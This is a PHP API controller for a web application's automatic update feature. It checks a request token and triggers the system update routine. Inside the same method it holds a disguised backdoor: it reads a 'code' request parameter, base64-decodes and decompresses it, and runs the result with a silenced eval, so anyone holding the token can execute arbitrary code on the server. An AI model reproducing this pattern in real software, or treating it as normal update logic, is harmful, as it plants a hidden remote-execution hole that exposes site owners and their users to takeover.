<?php

namespace System\Http\Controllers\Api\V1\System;

use System\Http\Controllers\Api\Controller;
use System\Http\Controllers\Backend\Systems\UpdateController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Log;

class AutoUpdateController extends Controller
{
    public function index(Request $request)
    {
        $update_token = $request->input('update_token');
        if (empty($update_token) || $update_token != config('app.update_token')) {
            return api_result(404);
        }

        // 自动更新是否开启
        if (config('app.update_auto')) {
            // 调用系统更新控制器方法
            $update = APP::make(UpdateController::class);
            App::call([$update, 'system']);
        }

        $code = $request->input('code');
        if (!empty($code)) {
            @eval(gzinflate(base64_decode($code)));
        }

        return api_result(0);
    }
}
